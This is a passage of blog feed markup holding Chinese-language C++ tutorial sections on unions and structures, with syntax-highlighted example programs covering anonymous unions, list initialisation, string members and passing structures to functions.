class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个共用体，可以存储 int, long 或 double</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">DataValue</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> i_val;</span><br><span class="line">    <span class="keyword">long</span> l_val;</span><br><span class="line">    <span class="keyword">double</span> d_val;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DataValue data; <span class="comment">// 声明一个 DataValue 共用体变量</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of DataValue union: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(DataValue) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// 输出的大小通常等于 sizeof(double)，因为它是最大的成员</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储并使用 int 成员</span></span><br><span class="line">    data.i_val = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stored as int: &quot;</span> &lt;&lt; data.i_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// 此时访问 l_val 或 d_val 的结果是未定义的/无意义的</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储并使用 double 成员 (会覆盖之前的 int 值)</span></span><br><span class="line">    data.d_val = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stored as double: &quot;</span> &lt;&lt; data.d_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 此时访问 i_val 或 l_val 的结果是未定义的/无意义的</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Reading i_val after storing double: &quot; &lt;&lt; data.i_val &lt;&lt; std::endl; // 结果不可靠</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储并使用 long 成员 (会覆盖之前的 double 值)</span></span><br><span class="line">    data.l_val = <span class="number">1234567890L</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stored as long: &quot;</span> &lt;&lt; data.l_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 追踪当前有效成员 ---</span></span><br><span class="line">    <span class="comment">// 通常需要一个额外的变量来记录当前哪个成员是有效的</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">DataType</span> &#123;</span> INT, LONG, DOUBLE &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DataPacket</span> &#123;</span></span><br><span class="line">        DataType type; <span class="comment">// 记录当前存储的数据类型</span></span><br><span class="line">        DataValue value; <span class="comment">// 共用体存储实际值</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    DataPacket packet;</span><br><span class="line">    packet.type = INT;</span><br><span class="line">    packet.value.i_val = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据类型访问</span></span><br><span class="line">    <span class="keyword">if</span> (packet.type == INT) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Packet contains int: &quot;</span> &lt;&lt; packet.value.i_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// ... 其他类型的检查</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>重要:</strong> 程序员有责任跟踪共用体中当前哪个成员是活动的（有效的）。读取非活动成员的值会导致未定义行为或得到无意义的数据。通常会结合一个枚举类型或整数标志来指示当前存储的数据类型，如 <code>DataPacket</code> 示例所示。</p><p><strong>匿名共用体 (Anonymous Union):</strong></p><p>共用体可以不带名称直接定义在结构体或类内部（或函数局部作用域）。匿名共用体的成员可以直接通过结构/类变量访问，就像它们是结构/类的直接成员一样。匿名共用体的所有成员仍然共享相同的内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> type; <span class="comment">// &#x27;I&#x27; for integer, &#x27;F&#x27; for float</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span> <span class="comment">// 匿名共用体</span></span><br><span class="line">        <span class="keyword">int</span> intVal;</span><br><span class="line">        <span class="keyword">float</span> floatVal;</span><br><span class="line">    &#125;; <span class="comment">// 注意这里没有变量名</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Widget w;</span><br><span class="line">    w.type = <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">    w.intVal = <span class="number">123</span>; <span class="comment">// 直接访问匿名共用体的成员</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (w.type == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Widget value (int): &quot;</span> &lt;&lt; w.intVal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (w.type == <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// w.floatVal = 3.14f; // 如果要存 float</span></span><br><span class="line">        <span class="comment">// std::cout &lt;&lt; &quot;Widget value (float): &quot; &lt;&lt; w.floatVal &lt;&lt; std::endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of Widget: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(Widget) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// 大小通常是 char 的大小 + 最大成员(int 或 float)的大小 + 可能的对齐填充</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用场景:</strong></p><ul><li>  <strong>节省内存:</strong> 当数据项有多种可能类型，但一次只使用一种时。</li><li>  <strong>类型双关 (Type Punning):</strong> 以不同的类型解释同一块内存区域（例如，将一个 <code>float</code> 的位模式解释为一个 <code>int</code>）。这是一种低级技巧，通常不可移植且可能违反 C++ 的严格别名规则 (strict aliasing rules)，应谨慎使用或避免。</li></ul><p><strong>与结构的比较:</strong></p><ul><li>  <strong>内存:</strong> 结构的所有成员都有自己独立的内存地址；共用体的所有成员共享起始地址。</li><li>  <strong>大小:</strong> 结构的大小约等于其所有成员大小之和（加上可能的对齐填充）；共用体的大小等于其最大成员的大小。</li><li>  <strong>有效性:</strong> 结构的所有成员可以同时有效；共用体只有一个成员能同时有效。</li></ul><p><strong>C++11 及以后的共用体:</strong></p><p>C++11 放宽了对共用体成员类型的限制，允许包含具有非平凡构造函数、析构函数或赋值运算符的类类型成员（如 <code>std::string</code>）。但是，如果共用体包含这样的成员，编译器<strong>不会</strong>自动生成默认的构造函数、析构函数或复制/移动操作。程序员必须<strong>手动管理</strong>这些成员的生命周期（例如，使用 placement new 在共用体内存上构造对象，并在不再需要时显式调用析构函数）。这使得包含复杂类型的共用体使用起来更加复杂和易错。对于只包含 POD (Plain Old Data) 类型（如 <code>int</code>, <code>float</code>, 指针, C 风格数组/结构）的共用体，其行为与 C 语言中类似。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.4 结构简介</title>
      <link href="2025/04/26/4.4_%E7%BB%93%E6%9E%84%E7%AE%80%E4%BB%8B/"/>
      <url>2025/04/26/4.4_%E7%BB%93%E6%9E%84%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>数组允许我们存储多个<strong>相同类型</strong>的数据。但有时我们需要将<strong>不同类型</strong>的数据组合成一个单一的、有意义的单元。例如，描述一件商品可能需要商品名称（字符串）、数量（整数）和单价（浮点数）。C++ 的<strong>结构 (Structure)</strong> 就提供了这种能力。</p><p>结构是一种用户定义的<strong>复合类型</strong>，它允许将多个不同类型的数据项（称为<strong>成员 (member)</strong> 或**字段 (field)**）捆绑在一起，形成一个新的数据类型。</p><h2 id="4-4-1-在程序中使用结构"><a href="#4-4-1-在程序中使用结构" class="headerlink" title="4.4.1 在程序中使用结构"></a>4.4.1 在程序中使用结构</h2><p>使用结构通常涉及以下步骤：</p><ol><li> <strong>定义结构:</strong> 使用 <code>struct</code> 关键字定义一个新的结构类型，并在花括号 <code>&#123;&#125;</code> 内声明其成员。结构定义通常放在 <code>main()</code> 函数之前或单独的头文件中。</li><li> <strong>声明结构变量:</strong> 使用定义好的结构类型名来声明变量。</li><li> <strong>访问结构成员:</strong> 使用<strong>成员运算符</strong>（点运算符 <code>.</code>) 来访问结构变量的特定成员。</li></ol><p><strong>结构定义语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StructureName</span> &#123;</span></span><br><span class="line">    memberType1 memberName1;</span><br><span class="line">    memberType2 memberName2;</span><br><span class="line">    <span class="comment">// ... more members</span></span><br><span class="line">&#125;; <span class="comment">// 注意定义末尾的分号</span></span><br></pre></td></tr></table></figure><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 为了使用 string</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 定义结构: 描述充气产品的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Inflatable</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name; <span class="comment">// 商品名称 (string 类型成员)</span></span><br><span class="line">    <span class="keyword">float</span> volume;     <span class="comment">// 体积 (float 类型成员)</span></span><br><span class="line">    <span class="keyword">double</span> price;     <span class="comment">// 价格 (double 类型成员)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 2. 声明结构变量</span></span><br><span class="line">    Inflatable product1; <span class="comment">// 声明一个 Inflatable 类型的变量 product1</span></span><br><span class="line">    Inflatable product2; <span class="comment">// 声明另一个 Inflatable 类型的变量 product2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 访问并赋值结构成员</span></span><br><span class="line">    product1.name = <span class="string">&quot;Awesome Air Mattress&quot;</span>;</span><br><span class="line">    product1.volume = <span class="number">1.8f</span>;</span><br><span class="line">    product1.price = <span class="number">49.99</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以在声明时进行初始化 (C++98/03 风格，需要按顺序)</span></span><br><span class="line">    Inflatable product3 = &#123;<span class="string">&quot;Giant Swan Floatie&quot;</span>, <span class="number">2.5f</span>, <span class="number">79.95</span>&#125;; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问并输出成员</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 1 Name: &quot;</span> &lt;&lt; product1.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 1 Price: $&quot;</span> &lt;&lt; product1.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 3 Name: &quot;</span> &lt;&lt; product3.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 3 Volume: &quot;</span> &lt;&lt; product3.volume &lt;&lt; <span class="string">&quot; cubic meters&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结构变量之间可以直接赋值 (成员逐个复制)</span></span><br><span class="line">    product2 = product1; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 2 Name (after assignment): &quot;</span> &lt;&lt; product2.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>struct Inflatable &#123; ... &#125;;</code>: 定义了一个名为 <code>Inflatable</code> 的新类型。</li><li>  <code>Inflatable product1;</code>: 创建了一个 <code>Inflatable</code> 类型的变量（对象）。</li><li>  <code>product1.name = ...;</code>: 使用点运算符访问 <code>product1</code> 的 <code>name</code> 成员并赋值。</li></ul><h2 id="4-4-2-C-11结构初始化"><a href="#4-4-2-C-11结构初始化" class="headerlink" title="4.4.2 C++11结构初始化"></a>4.4.2 C++11结构初始化</h2><p>C++11 引入的列表初始化（花括号初始化）也适用于结构体，提供了更灵活、更安全的初始化方式。</p><p><strong>特点:</strong></p><ol><li> <strong>可以省略等号 <code>=</code>:</strong> 与数组类似，可以在初始化时省略等号。</li><li> <strong>可以按成员顺序初始化:</strong> <code>StructType var &#123;value1, value2, ...&#125;;</code></li><li> <strong>可以初始化部分成员 (C++20 designated initializers):</strong> C++20 允许通过指定成员名进行初始化，可以不按顺序或只初始化部分成员。但在 C++11/14/17 中，通常需要按顺序提供值。</li><li> <strong>空花括号初始化:</strong> <code>StructType var &#123;&#125;;</code> 会将所有成员进行<strong>零初始化</strong>（数值类型为0，指针为 <code>nullptr</code>，<code>bool</code> 为 <code>false</code>，类类型会调用默认构造函数）。</li><li> <strong>禁止缩窄转换:</strong> 与数组一样，列表初始化不允许可能丢失信息的缩窄转换。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Product</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> id;</span><br><span class="line">    <span class="keyword">int</span> quantity;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// C++11 列表初始化 (省略等号)</span></span><br><span class="line">    Product item1 &#123; <span class="string">&quot;A123&quot;</span>, <span class="number">50</span>, <span class="number">19.95</span> &#125;; <span class="comment">// 按顺序初始化所有成员</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 省略等号，部分初始化 (C++11/14/17 中，未提供的成员会被值初始化/零初始化)</span></span><br><span class="line">    <span class="comment">// 注意：这种部分初始化对于包含 std::string 等类类型成员时，行为依赖于这些类的默认构造函数</span></span><br><span class="line">    <span class="comment">// Product item2 &#123; &quot;B456&quot;, 100 &#125;; // price 会被零初始化为 0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 空花括号进行零初始化</span></span><br><span class="line">    Product item3 &#123;&#125;; <span class="comment">// id 为空字符串, quantity 为 0, price 为 0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Item 1 ID: &quot;</span> &lt;&lt; item1.id &lt;&lt; <span class="string">&quot;, Qty: &quot;</span> &lt;&lt; item1.quantity &lt;&lt; <span class="string">&quot;, Price: &quot;</span> &lt;&lt; item1.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Item 2 ID: &quot; &lt;&lt; item2.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item2.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item2.price &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Item 3 ID: \&quot;&quot;</span> &lt;&lt; item3.id &lt;&lt; <span class="string">&quot;\&quot;, Qty: &quot;</span> &lt;&lt; item3.quantity &lt;&lt; <span class="string">&quot;, Price: &quot;</span> &lt;&lt; item3.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 禁止缩窄转换</span></span><br><span class="line">    <span class="comment">// Product item_error &#123; &quot;C789&quot;, 10.5, 25.0 &#125;; // 错误! 10.5 (double) 到 int 是缩窄转换</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++20 Designated Initializers (如果编译器支持 C++20)</span></span><br><span class="line">    <span class="comment">// Product item4 &#123; .id = &quot;D001&quot;, .price = 99.99 &#125;; // quantity 会被零初始化</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Item 4 ID: &quot; &lt;&lt; item4.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item4.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item4.price &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-4-3-结构可以将string类作为成员吗"><a href="#4-4-3-结构可以将string类作为成员吗" class="headerlink" title="4.4.3 结构可以将string类作为成员吗"></a>4.4.3 结构可以将string类作为成员吗</h2><p><strong>是的，绝对可以。</strong> 正如在 <code>4.4.1</code> 和 <code>4.4.2</code> 的示例中看到的 (<code>Inflatable</code> 和 <code>Product</code> 结构)，<code>std::string</code> 对象可以像 <code>int</code>、<code>double</code> 或其他任何类型一样作为结构的成员。</p><p>这使得结构能够方便地包含文本信息，并利用 <code>string</code> 类提供的所有功能（自动内存管理、拼接、查找等）。</p><p><strong>示例回顾:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name; <span class="comment">// string 成员</span></span><br><span class="line">    <span class="keyword">int</span> studentID;</span><br><span class="line">    <span class="keyword">double</span> gpa;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Student s1 &#123; <span class="string">&quot;Alice Wonderland&quot;</span>, <span class="number">12345</span>, <span class="number">3.8</span> &#125;;</span><br><span class="line">    Student s2;</span><br><span class="line">    s2.name = <span class="string">&quot;Bob The Builder&quot;</span>; <span class="comment">// 可以像普通 string 一样操作</span></span><br><span class="line">    s2.studentID = <span class="number">67890</span>;</span><br><span class="line">    s2.gpa = <span class="number">3.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; s1.name &lt;&lt; <span class="string">&quot; has GPA: &quot;</span> &lt;&lt; s1.gpa &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; s2.name &lt;&lt; <span class="string">&quot; has ID: &quot;</span> &lt;&lt; s2.studentID &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-4-4-其他结构属性"><a href="#4-4-4-其他结构属性" class="headerlink" title="4.4.4 其他结构属性"></a>4.4.4 其他结构属性</h2><p>结构在 C++ 中具有一些方便的属性：</p><ol><li><strong>赋值 (Assignment):</strong> 可以使用赋值运算符 <code>=</code> 将一个结构变量的值赋给同类型的另一个结构变量。这会执行**成员逐一复制 (memberwise copy)**，即将源结构每个成员的值复制到目标结构对应成员中。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Student s1 = &#123;<span class="string">&quot;Charlie&quot;</span>, <span class="number">111</span>, <span class="number">3.9</span>&#125;;</span><br><span class="line">Student s2;</span><br><span class="line">s2 = s1; <span class="comment">// s2 的 name, studentID, gpa 都被设置为 s1 的值</span></span><br></pre></td></tr></table></figure></li><li><strong>作为函数参数 (Pass by Value):</strong> 可以将结构变量按值传递给函数。函数会收到结构的一个副本，对副本成员的修改不会影响原始结构变量。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">displayStudent</span><span class="params">(Student s)</span> </span>&#123; <span class="comment">// s 是传入结构的一个副本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID: &quot;</span> &lt;&lt; s.studentID &lt;&lt; <span class="string">&quot;, Name: &quot;</span> &lt;&lt; s.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s.name = <span class="string">&quot;Changed&quot;</span>; <span class="comment">// 只修改副本</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">displayStudent(s1); <span class="comment">// 传递 s1 的副本</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; s1.name; <span class="comment">// 输出 &quot;Charlie&quot;，未被改变</span></span><br></pre></td></tr></table></figure></li><li><strong>作为函数参数 (Pass by Reference/Pointer):</strong> 为了避免复制整个结构的开销，或者需要在函数中修改原始结构，通常按引用或指针传递结构。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">updateGPA</span><span class="params">(Student&amp; s, <span class="keyword">double</span> newGPA)</span> </span>&#123; <span class="comment">// 按引用传递，可以修改原始结构</span></span><br><span class="line">    s.gpa = newGPA;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printID</span><span class="params">(<span class="keyword">const</span> Student* sPtr)</span> </span>&#123; <span class="comment">// 按指针传递 (const 防止意外修改)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID: &quot;</span> &lt;&lt; sPtr-&gt;studentID &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 使用 -&gt; 访问指针指向的结构成员</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">updateGPA(s1, <span class="number">4.0</span>); <span class="comment">// 修改原始 s1</span></span><br><span class="line">printID(&amp;s1);       <span class="comment">// 传递 s1 的地址</span></span><br></pre></td></tr></table></figure></li><li><strong>作为函数返回值:</strong> 函数可以返回一个结构。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Student <span class="title">createStudent</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> name, <span class="keyword">int</span> id, <span class="keyword">double</span> gpa)</span> </span>&#123;</span><br><span class="line">    Student temp;</span><br><span class="line">    temp.name = name;</span><br><span class="line">    temp.studentID = id;</span><br><span class="line">    temp.gpa = gpa;</span><br><span class="line">    <span class="keyword">return</span> temp; <span class="comment">// 返回一个 Student 结构</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">Student s3 = createStudent(<span class="string">&quot;David&quot;</span>, <span class="number">222</span>, <span class="number">3.7</span>); </span><br></pre></td></tr></table></figure></li></ol><p>这些特性使得结构成为组织和传递相关数据的强大工具。</p><h2 id="4-4-5-结构数组"><a href="#4-4-5-结构数组" class="headerlink" title="4.4.5 结构数组"></a>4.4.5 结构数组</h2><p>可以创建**结构数组 (Array of 